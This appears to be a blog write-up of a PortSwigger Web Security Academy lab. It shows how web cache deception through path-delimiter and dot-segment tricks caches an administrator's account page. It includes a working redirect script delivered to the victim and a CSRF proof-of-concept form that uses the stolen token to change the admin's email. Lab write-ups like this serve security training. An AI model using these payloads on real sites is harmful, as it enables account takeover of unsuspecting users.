---
title: Exploiting exact-match cache rules for web cache deception
date: 2024-12-21
categories: [Blogs]
tags: AppSec Web WebCache
img_path: /assets/BlogImgs/web-cache-deception.png
image:
  path: /assets/BlogImgs/web-cache-deception.png
---

<img src="assets/web-cache-deception/image1.png" alt="Error loading image">


### Step1:

Login with the given credentials

<img src="assets/web-cache-deception/image2.png" alt="Error loading image">

Send the request to the repeater

<img src="assets/web-cache-deception/image3.png" alt="Error loading image">

Here, we can see that there is no cache support for this request because there is no header in the response, such as:

```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

Now we append `/<anyword>` to the URL and send the request. In the response, we can see a '404 Not Found' status.

<img src="assets/web-cache-deception/image4.png" alt="Error loading image">

First, we identify the supported delimiter. Send the request to the Intruder, select the ` / `, and test a list of delimiters provided in the lab's list.

<img src="assets/web-cache-deception/image5.png" alt="Error loading image">

**Payload setting**

Add a position for the payload, and in the payload settings, paste the copied payload list.

<img src="assets/web-cache-deception/image6.png" alt="Error loading image">

At the bottom of the page, we have the payload encoding option. Turn this off.

<img src="assets/web-cache-deception/image7.png" alt="Error loading image">

In the response, we can see that only two delimiters are supported.

<img src="assets/web-cache-deception/image8.png" alt="Error loading image">

### Step2:

Try these delimiters

<img src="assets/web-cache-deception/image9.png" alt="Error loading image">

We can see that we have an OK response, but no cache header is supported. The same is observed in the result given below with the second delimiter ` ? `

<img src="assets/web-cache-deception/image10.png" alt="Error loading image">

### Step3:

Now, we add any directory followed by a dot segment and the encoded ` / `, then append the my-account endpoint, like

<img src="assets/web-cache-deception/image11.png" alt="Error loading image">

Let’s send another file and check if it returns a cached response, like `/resources/labheader/js/labHeader.js`

<img src="assets/web-cache-deception/image12.png" alt="Error loading image">

The response has no cache-supported header.

<img src="assets/web-cache-deception/image13.png" alt="Error loading image">

### Step4:



Now, we find the file being cached, such as `index.html` or `.htaccess.` For this, we use a list of common files.

Send the `/hello/..%2f.%2f..%2f..%2fmy-account` request to Intruder.

Select the `my-account` and try the list of common files.

<img src="assets/web-cache-deception/image14.png" alt="Error loading image">


**Payload setting**

<img src="assets/web-cache-deception/image15.png" alt="Error loading image">

We can see in the response, when we sort by length, that two files support caching: `robots.txt` and `favicon.ico`

<img src="assets/web-cache-deception/image16.png" alt="Error loading image">

We can clearly see in the `robots.txt` and `favicon.ico` responses that the files are not found, but they are cached.

<img src="assets/web-cache-deception/image17.png" alt="Error loading image">

The same is true for `favicon.ico`

<img src="assets/web-cache-deception/image18.png" alt="Error loading image">

### Step5:

Now, to get a 200 OK response and ensure the response is cached, we try the delimiter `?`

<img src="assets/web-cache-deception/image19.png" alt="Error loading image">

Here, we have a 200 OK response, but there is no cache header in the response.

Lets try with `;`

<img src="assets/web-cache-deception/image20.png" alt="Error loading image">

Here, we can see a 200 OK response when we use the `;` delimiter. The same response occurs when we use `robots.txt` instead of `favicon.ico` .

### Step6:

Now, to find the cache buster, we append `?<anything>` to `favicon.ico`.

<img src="assets/web-cache-deception/image21.png" alt="Error loading image">

Here, I noticed that when I change the cache busting, it does not affect the response, meaning there is no change in the cache hit or miss

But when I try it with `robots.txt`, it works.

First request

<img src="assets/web-cache-deception/image22.png" alt="Error loading image">

Again send the request

<img src="assets/web-cache-deception/image23.png" alt="Error loading image">

### Step7:

Simply copy the URL and add it in the script, but we encode `..`. So, `/../../../../` becomes:
`%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f`.

Before encoding, the URL is:

```
https://0a1b00ea0389511483df198400d80085.web-security-academy.net/my-account;..%2f.%2f..%2f..%2frobots.txt?cacheBusting5.
```
After encoding, the URL becomes:

```
https://0a1b00ea0389511483df198400d80085.web-security-academy.net/my-account;%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt?cacheBusting5.
```

The final script looks like this:

```
<script>document.location="https://0a1b00ea0389511483df198400d80085.web-security-academy.net/my-account;%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt?cacheBusting5"</script>

```

Now, we store it on the exploit server and deliver it to the victim.

<img src="assets/web-cache-deception/image24.png" alt="Error loading image">

When I paste the URL into a new window, it redirects to the login page.

<img src="assets/web-cache-deception/image25.png" alt="Error loading image">

Now, we need to change the email for the admin. To do this, we first obtain the CSRF token for the admin user.

Next, we change the cache busting again, store it, and deliver it to the victim. After delivering it to the victim, send the following request in Repeater within 20 to 30 seconds.

We can see that the CSRF token for the administrator account is present

<img src="assets/web-cache-deception/image26.png" alt="Error loading image">

### Step8:

Now, we need to change the email. First, we change our email and send the `/my-account/change-email` request to Repeater

Replace the CSRF token with the one from the previous response and change the email.

<img src="assets/web-cache-deception/image27.png" alt="Error loading image">

Now, **right-click -> Extension -> CSRF PoC Generator** and generate a proof of concept for this request.

<img src="assets/web-cache-deception/image28.png" alt="Error loading image">

If you don’t have the professional version, generate the PoC using an online PoC generator, or you can simply copy the code below and replace the CSRF value with yours.

```
<html>
<! - CSRF PoC - generated by Burp Suite Professional →
<body>
<form action="https://0a1b00ea0389511483df198400d80085.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="i&#95;am&#95;admin&#64;admin&#46;com" />
<input type="hidden" name="csrf" value="cXVxuNNK9lQniEV9MHoBXnH5WN7byec5" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```
Copy this and send it to the victim through the exploit server.

<img src="assets/web-cache-deception/image29.png" alt="Error loading image">

Click ‘Store’ and deliver it to the victim. The lab is now solved.

For more writeups on PortSwigger labs, visit this GitHub repository I have created for dedicated PortSwigger labs: [PortSwigger Lab Solution](https://github.com/mun1bxD/Web-Exploitation) .